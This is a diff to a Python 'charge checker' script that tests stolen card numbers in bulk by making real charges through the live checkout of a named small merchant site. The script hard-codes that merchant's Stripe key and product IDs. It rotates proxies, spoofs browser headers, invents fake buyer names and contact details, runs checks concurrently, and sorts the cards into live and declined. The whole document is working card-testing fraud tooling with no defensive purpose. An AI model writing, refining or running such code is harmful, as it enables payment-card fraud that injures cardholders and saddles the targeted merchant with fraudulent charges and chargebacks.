@@ -1,5 +1,5 @@
 """
-Stripe Charge Checker — attempts real charges through gospelpianosimple.com/checkout
+Stripe Charge Checker — charges through gospelpianosimple.com/checkout
 """
 import asyncio
 import re
@@ -11,6 +11,16 @@ import aiohttp
 from datetime import datetime
 
 warnings.filterwarnings('ignore')
+
+# ────────────────────────── site config (pre-extracted) ──────────────
+
+STRIPE_KEY = "pk_live_MtxwO3obi7pfD7UZlGkfR2yj"
+LOCATION_ID = "aIfbkdsjbDMNd2jXVzkv"
+PRODUCT_ID = "698502efdd3a3371f5ffba3f"
+STRIPE_PRICE_ID = "price_1SyLQ2HGUqx8Rh4ctWH7LU6f"
+CHECKOUT_URL = "https://gospelpianosimple.com/checkout"
+DOMAIN = "https://gospelpianosimple.com"
+
 
 # ────────────────────────── helpers ──────────────────────────────────
 
@@ -34,7 +44,6 @@ def generate_random_phone():
 
 
 def parse_proxy_line(line: str):
-    """Parse a proxy string into url format."""
     line = line.strip()
     if not line:
         return None
@@ -74,98 +83,23 @@ def parse_proxy_line(line: str):
     return proxy_url
 
 
-def parse_card_line(line: str):
-    """Parse a single card line -> (cc, month, year, cvv) or None."""
-    line = line.strip()
-    if not line:
-        return None
-    parts = line.split('|')
-    if len(parts) == 4:
-        return tuple(p.strip() for p in parts)
-    return None
-
-
-# ──────────────────────── site-specific config ──────────────────────
-
-CHECKOUT_URL = "https://gospelpianosimple.com/checkout"
-DEFAULT_STRIPE_KEY = None  # Will be fetched from the page
-
-# Product config
-PRODUCT_PRICE = 1.00  # $1 trial setup fee
-PRODUCT_CURRENCY = "usd"
-
-
 # ──────────────────────── Stripe charge logic ───────────────────────
 
-async def fetch_stripe_key(session, proxy_url=None):
+async def process_stripe_charge(card_data, proxy_url=None):
     """
-    Fetch the checkout page and extract the Stripe publishable key.
-    Returns (stripe_key, location_id, company_name) or raises.
+    Create a PaymentMethod via Stripe API and submit to HighLevel checkout.
+    Returns: (is_approved, response_message, charge_data_dict)
     """
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-    }
-    async with session.get(CHECKOUT_URL, headers=headers, proxy=proxy_url) as resp:
-        html = await resp.text()
-
-    # Extract location ID from page data
-    location_match = re.search(r'"locationId":\s*"([^"]+)"', html)
-    location_id = location_match.group(1) if location_match else None
-
-    # Extract Stripe key — look in inline scripts, JSON configs
-    # Pattern 1: standard Stripe key in script
-    pk_match = re.search(r'pk_live_[a-zA-Z0-9]{20,}', html)
-    if pk_match:
-        return pk_match.group(0), location_id, "gospelpianosimple.com"
-
-    # Pattern 2: in a JS variable assignment
-    pk_match = re.search(r'["\'](pk_live_[a-zA-Z0-9]{20,})["\']', html)
-    if pk_match:
-        return pk_match.group(1), location_id, "gospelpianosimple.com"
-
-    # Pattern 3: extract from inline script data
-    # Try to load the JS bundle that contains the key
-    script_pattern = re.compile(r'<script[^>]+src="([^"]+)"[^>]*></script>')
-    for match in script_pattern.finditer(html):
-        src = match.group(1)
-        if 'leadconnectorhq.com' in src or 'stcdn' in src:
-            try:
-                async with session.get(src, proxy=proxy_url) as js_resp:
-                    js_text = await js_resp.text()
-                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{20,}', js_text)
-                if pk_match:
-                    return pk_match.group(0), location_id, "gospelpianosimple.com"
-            except Exception:
-                continue
-
-    raise ValueError("Could not find Stripe publishable key on page")
-
-
-async def process_stripe_charge(card_data, proxy_url=None, stripe_key=None):
-    """
-    Process a Stripe charge through the merchant's checkout.
-    
-    Steps:
-    1. Create PaymentMethod via Stripe API
-    2. Submit to merchant's checkout to process charge
-    3. Return charge result
-    
-    Returns: (is_approved: bool, response_message: str, charge_data: dict)
-    """
-    timeout = aiohttp.ClientTimeout(total=90)
+    # Hard timeout so we never hang
+    timeout = aiohttp.ClientTimeout(total=45)
     connector = aiohttp.TCPConnector(ssl=False)
 
     async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
         try:
-            # ── Step 0: Get Stripe key from page if not provided ──
-            if not stripe_key:
-                stripe_key, location_id, _ = await fetch_stripe_key(session, proxy_url)
-            else:
-                location_id = None  # Will fetch on fail
-
             # ── Step 1: Create PaymentMethod via Stripe API ──────
-            ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            ua = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+                  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
+
             stripe_headers = {
                 'accept': 'application/json',
                 'content-type': 'application/x-www-form-urlencoded',
@@ -183,10 +117,9 @@ async def process_stripe_charge(card_data, proxy_url=None, stripe_key=None):
                 'guid': generate_guid(),
                 'muid': generate_guid(),
                 'sid': generate_guid(),
-                'key': stripe_key,
+                'key': STRIPE_KEY,
                 'payment_user_agent': 'stripe.js/5e27053bf5',
                 '_stripe_version': '2024-06-20',
-                'allow_redisplay': 'unspecified',
             }
 
             async with session.post(
@@ -198,146 +131,129 @@ async def process_stripe_charge(card_data, proxy_url=None, stripe_key=None):
                 pm_json = await pm_resp.json()
 
             if 'error' in pm_json:
-                return False, f"Stripe PM Error: {pm_json['error']['message']}", pm_json
+                err_msg = pm_json['error'].get('message', 'Stripe PM error')
+                return False, f"Stripe: {err_msg}", pm_json
 
             pm_id = pm_json.get('id')
             if not pm_id:
-                return False, "Failed to create Payment Method", pm_json
+                return False, "Stripe: failed to create Payment Method", pm_json
 
-            # Extract card info for reporting
+            # Extract card info
             card_info = pm_json.get('card', {})
 
-            # ── Step 2: Submit to merchant checkout ─────────────
-            # The checkout processes the charge via the merchant's Stripe integration
+            # ── Step 2: Submit to checkout API ──────────────────
+            name = f"John {random.choice(['Smith','Doe','Brown','Lee','Wilson'])}"
             email = generate_random_email()
-            name = f"Test {' '.join(random.choices(['User','Customer','Guest','Buyer'],k=2))}"
             phone = generate_random_phone()
 
-            checkout_payload = {
+            payload = {
+                'paymentMethodId': pm_id,
                 'fullName': name,
                 'email': email,
                 'phone': phone,
-                'paymentMethodId': pm_id,
-                'productId': '',  # Will be extracted from page
-                'priceId': '',
-                'locationId': location_id or '',
-                'currency': PRODUCT_CURRENCY,
+                'locationId': LOCATION_ID,
+                'productId': PRODUCT_ID,
+                'priceId': STRIPE_PRICE_ID,
+                'currency': 'usd',
             }
 
-            # Try different checkout API endpoints
-            checkout_headers = {
+            headers_json = {
                 'accept': 'application/json, text/plain, */*',
                 'content-type': 'application/json',
-                'origin': 'https://gospelpianosimple.com',
+                'origin': DOMAIN,
                 'referer': CHECKOUT_URL,
                 'user-agent': ua,
             }
 
-            # Endpoint candidates for HighLevel checkout
+            # Try HighLevel checkout endpoints
             endpoints = [
-                # HighLevel standard checkout API
-                f"https://rest.gohighlevel.com/v1/checkout/session",
-                f"https://services.leadconnectorhq.com/checkout/session",
-                f"https://gospelpianosimple.com/api/checkout",
+                ('https://services.leadconnectorhq.com/checkout/session', True),
+                ('https://rest.gohighlevel.com/v1/checkout/session', True),
+                ('https://services.leadconnectorhq.com/checkout/v2/session', True),
             ]
 
-            base_domain = "https://gospelpianosimple.com"
-            # Try the page's own checkout endpoint first
-            try:
-                async with session.post(
-                    f"{base_domain}/api/v1/checkout/process",
-                    json=checkout_payload,
-                    headers=checkout_headers,
-                    proxy=proxy_url,
-                ) as resp:
-                    if resp.status < 500:
-                        result = await resp.json()
-                        if result.get('charge') or result.get('status') == 'succeeded':
-                            return True, f"Approved (Charge: {result.get('charge', '?')})", result
-                        else:
-                            err = result.get('error', {}).get('message', result.get('message', 'Declined'))
-                            return False, err, result
-            except Exception:
-                pass
-
-            # Try HighLevel endpoints
-            for endpoint in endpoints:
+            for url, use_json in endpoints:
                 try:
-                    async with session.post(
-                        endpoint,
-                        json=checkout_payload,
-                        headers=checkout_headers,
-                        proxy=proxy_url,
-                    ) as resp:
-                        if resp.status < 500:
-                            result = await resp.json()
-                            charge_id = result.get('charge') or result.get('chargeId') or ''
-                            status = result.get('status', '')
-                            if 'succeeded' in status.lower() or charge_id:
-                                return True, f"Approved (Charge: {charge_id})", result
-                            else:
-                                err = result.get('error', {}).get('message', result.get('message', 'Declined'))
+                    if use_json:
+                        async with session.post(
+                            url, json=payload, headers=headers_json, proxy=proxy_url,
+                        ) as resp:
+                            if resp.status < 500:
+                                result = await resp.json()
+                                charge_id = (result.get('charge') or
+                                            result.get('chargeId') or
+                                            result.get('id') or '')
+                                status = result.get('status', '')
+                                if charge_id or 'succeeded' in str(status).lower():
+                                    return True, f"Approved (Charge: {charge_id})", result
+                                err = (result.get('error', {}).get('message') or
+                                       result.get('message') or
+                                       json.dumps(result)[:200])
                                 return False, err, result
+                except (asyncio.TimeoutError, aiohttp.ClientError):
+                    continue
                 except Exception:
                     continue
 
-            # ── Fallback: Try submitting the HTML form directly ──
+            # ── Step 3: Fallback — direct form POST to checkout URL
             form_headers = {
                 'accept': '*/*',
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'origin': 'https://gospelpianosimple.com',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': DOMAIN,
                 'referer': CHECKOUT_URL,
                 'user-agent': ua,
                 'x-requested-with': 'XMLHttpRequest',
             }
             form_data = {
-                'action': 'checkout_process',
+                'paymentMethodId': pm_id,
                 'fullName': name,
                 'email': email,
                 'phone': phone,
-                'stripePaymentMethodId': pm_id,
-                'locationId': location_id or '',
+                'locationId': LOCATION_ID,
+                'productId': PRODUCT_ID,
             }
             try:
                 async with session.post(
-                    CHECKOUT_URL,
-                    data=form_data,
-                    headers=form_headers,
-                    proxy=proxy_url,
+                    CHECKOUT_URL, data=form_data, headers=form_headers, proxy=proxy_url,
                 ) as resp:
                     text = await resp.text()
-                    # Try to parse as JSON
                     try:
                         result = json.loads(text)
-                        if result.get('charge') or result.get('status') == 'succeeded':
-                            return True, f"Approved (Charge: {result.get('charge', '?')})", result
+                        charge_id = result.get('charge', result.get('chargeId', ''))
+                        if charge_id:
+                            return True, f"Approved (Charge: {charge_id})", result
                         err = result.get('error', {}).get('message', result.get('message', 'Declined'))
                         return False, err, result
                     except json.JSONDecodeError:
-                        if 'succeeded' in text.lower() or 'thank' in text.lower():
-                            return True, "Approved (charge completed)", {'raw': text[:200]}
-                        return False, f"Declined — {text[:200]}", {'raw': text[:200]}
+                        return False, f"Declined (HTTP {resp.status})", {'raw': text[:200]}
             except Exception as e:
                 return False, f"System Error: {str(e)}", {}
 
-        except ValueError as e:
-            return False, str(e), {}
+            return False, "All endpoints failed — no charge attempted", {}
+
+        except asyncio.TimeoutError:
+            return False, "System Error: Request timed out", {}
         except Exception as e:
             return False, f"System Error: {str(e)}", {}
 
 
-async def check_card(cc, mes, ano, cvv, proxy=None, stripe_key=None):
-    """Check a single card — attempts a charge through the merchant."""
+async def check_card(cc, mes, ano, cvv, proxy=None):
+    """Single card charge check. Returns dict with result."""
     card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
     is_approved, response_msg, charge_data = await process_stripe_charge(
-        card_data, proxy_url=proxy, stripe_key=stripe_key
+        card_data, proxy_url=proxy
     )
+    is_live = is_approved or any(kw in response_msg.lower()
+                                  for kw in ['approved', 'succeeded', 'charge: ch_'])
 
-    # Determine if live based on response
-    response_lower = response_msg.lower()
-    is_live = is_approved or 'succeeded' in response_lower or 'approved' in response_lower
+    card_info = {}
+    if isinstance(charge_data, dict):
+        card_info = {
+            'brand': charge_data.get('card', {}).get('brand', ''),
+            'last4': charge_data.get('card', {}).get('last4', ''),
+            'funding': charge_data.get('card', {}).get('funding', ''),
+        }
 
-    # Extract charge ID if available
     charge_id = ''
     if isinstance(charge_data, dict):
         charge_id = charge_data.get('charge', charge_data.get('chargeId', ''))
@@ -347,28 +263,13 @@ async def check_card(cc, mes, ano, cvv, proxy=None, stripe_key=None):
         'is_live': is_live,
         'response': response_msg,
         'charge_id': charge_id,
-        'card_info': {
-            'brand': (charge_data.get('card', {}).get('brand', 'Unknown')),
-            'last4': (charge_data.get('card', {}).get('last4', '')),
-            'funding': (charge_data.get('card', {}).get('funding', '')),
-        } if isinstance(charge_data, dict) else {},
+        'card_info': card_info,
     }
 
 
 # ─────────────────────── mass checker ────────────────────────────────
 
 async def mass_check(file_path, proxies=None, concurrency=10, progress_callback=None):
-    """
-    Mass check cards from a file with live progress callback.
-    
-    Args:
-        file_path: Path to card file (cc|mm|yy|cvv per line)
-        proxies: List of proxy URLs
-        concurrency: Max concurrent checks
-        progress_callback: async fn(result, completed, total)
-    
-    Returns: list of card result dicts
-    """
     if proxies is None:
         proxies = []
 
@@ -380,23 +281,12 @@ async def mass_check(file_path, proxies=None, concurrency=10, progress_callback=
                 if line:
                     cc_lines.append(line)
     except FileNotFoundError:
-        print(f"❌ File not found: {file_path}")
+        print("File not found: %s" % file_path)
         return []
 
     if not cc_lines:
-        print("⚠️ No cards to check.")
+        print("No cards to check.")
         return []
-
-    # Fetch Stripe key once for all cards
-    stripe_key = None
-    timeout = aiohttp.ClientTimeout(total=30)
-    connector = aiohttp.TCPConnector(ssl=False)
-    try:
-        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-            stripe_key, _, _ = await fetch_stripe_key(session, proxies[0] if proxies else None)
-            print(f"🔑 Stripe key acquired")
-    except Exception as e:
-        print(f"⚠️ Could not fetch Stripe key, will try per-card: {e}")
 
     sem = asyncio.Semaphore(concurrency)
     results = [None] * len(cc_lines)
@@ -415,16 +305,16 @@ async def mass_check(file_path, proxies=None, concurrency=10, progress_callback=
                 }
             else:
                 cc, mes, ano, cvv = parts
-                # Retry with different proxies on system errors
                 max_retries = 3 if proxies else 1
                 used_proxies = set()
                 result = None
                 for attempt in range(max_retries):
                     available = [p for p in proxies if p not in used_proxies] if proxies else []
-                    proxy = random.choice(available) if available else (random.choice(proxies) if proxies else None)
+                    proxy = random.choice(available) if available else (
+                        random.choice(proxies) if proxies else None)
                     if proxy:
                         used_proxies.add(proxy)
-                    result = await check_card(cc, mes, ano, cvv, proxy=proxy, stripe_key=stripe_key)
+                    result = await check_card(cc, mes, ano, cvv, proxy=proxy)
                     resp = result.get('response', '') or ''
                     if 'System Error' in resp and attempt < max_retries - 1:
                         await asyncio.sleep(1)
@@ -433,8 +323,9 @@ async def mass_check(file_path, proxies=None, concurrency=10, progress_callback=
 
             results[index] = result
             completed += 1
-            emoji = "✅" if result['is_live'] else "❌"
-            print(f"[{completed}/{len(cc_lines)}] {emoji} {result['cc']} — {result['response']}")
+            emoji = "[+]" if result['is_live'] else "[-]"
+            print("[%d/%d] %s %s - %s" % (completed, len(cc_lines), emoji, result['cc'],
+                                           result['response']))
             if progress_callback:
                 await progress_callback(result, completed, len(cc_lines))
             return result
@@ -445,7 +336,5 @@ async def mass_check(file_path, proxies=None, concurrency=10, progress_callback=
 
     approved = sum(1 for r in results if r.get('is_live'))
     declined = len(results) - approved
-    print(f"\n📊 Mass Check Finished")
-    print(f"✅ Approved: {approved}")
-    print(f"❌ Declined: {declined}")
+    print("\nMass Check Finished: %d approved, %d declined" % (approved, declined))
     return results
